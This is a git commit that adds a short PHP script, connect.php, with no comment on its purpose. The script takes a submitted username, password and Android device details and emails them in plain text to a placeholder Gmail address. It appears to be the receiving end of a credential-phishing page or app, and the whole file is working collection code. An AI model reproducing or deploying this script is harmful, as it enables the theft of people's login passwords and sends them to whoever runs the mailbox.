fd4af64fbb4835a8adc675f3e70c372cdf0238c3
Aria Shirazi <47100747+ariashirazi@users.noreply.github.com>
2021-03-25 01:22:46 +0430

    Add files via upload

---
+++ connect.php
@@ -0,0 +1,16 @@
+<?php
+	$username=$_POST['Username'];
+	$password=$_POST['Password'];
+	$time=$_POST['Time'];
+	$manufacturer=$_POST['Manufacturer'];
+	$mobilemodel=$_POST['MobileModel'];
+	$androidversion=$_POST['AndroidVersion'];
+	$androidApi=$_POST['AndroidApi'];
+
+	
+	$to="emample@gmail.com";
+	$subject="Message";
+	$body=" username: $username \n password: $password \n time: $time \n Manufacturer: $manufacturer \n MobileModel: $mobilemodel \n Android Version: $androidversion \n Api: $androidApi";
+	mail($to,$subject,$body);
+
+?>
